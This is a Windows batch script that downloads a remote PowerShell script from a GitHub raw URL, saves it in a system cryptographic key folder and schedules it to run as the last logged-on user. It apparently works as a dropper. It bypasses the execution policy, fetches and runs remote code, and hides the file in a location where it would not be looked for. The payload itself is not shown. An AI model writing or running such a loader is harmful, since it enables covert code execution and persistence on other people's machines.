@echo off
setlocal

echo Downloading PowerShell script...
powershell -ExecutionPolicy Bypass -command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/user10327/zebrah/main/v2.ps1 -OutFile C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys\prompt.ps1"
if %errorlevel% neq 0 (
    echo Failed to download prompt.ps1
    exit /b %errorlevel%
)
echo prompt.ps1 downloaded

:: Get current date and time
set "CurrentTime=%TIME%"
:: Ensure double digits in hours
if "%CurrentTime:~0,1%"==" " set CurrentTime=0%CurrentTime:~1%
:: Use current time directly for scheduling
set "ScheduledTime=%CurrentTime:~0,5%"

:: Get the last logged-on user from the registry
for /f "tokens=2*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI" /v LastLoggedOnUser') do (
    set "user=%%b"
)

set "ScriptPath=C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys\prompt.ps1"
set "TaskName=start-prompt"
set "UserName=%user%"

echo last logged in user: %UserName%
echo creating task...
:: Schedule the task to run the PowerShell script at the current time
schtasks /create /tn "%TaskName%" /tr "powershell.exe -ExecutionPolicy Bypass -File '%ScriptPath%'" /sc once /st "%ScheduledTime%" /ru "%UserName%" /rp /sd "%DATE%"
if %errorlevel% neq 0 (
    echo Failed to create task
    exit /b %errorlevel%
)

echo Task has been scheduled to run at %ScheduledTime% on %DATE%.

endlocal
pause
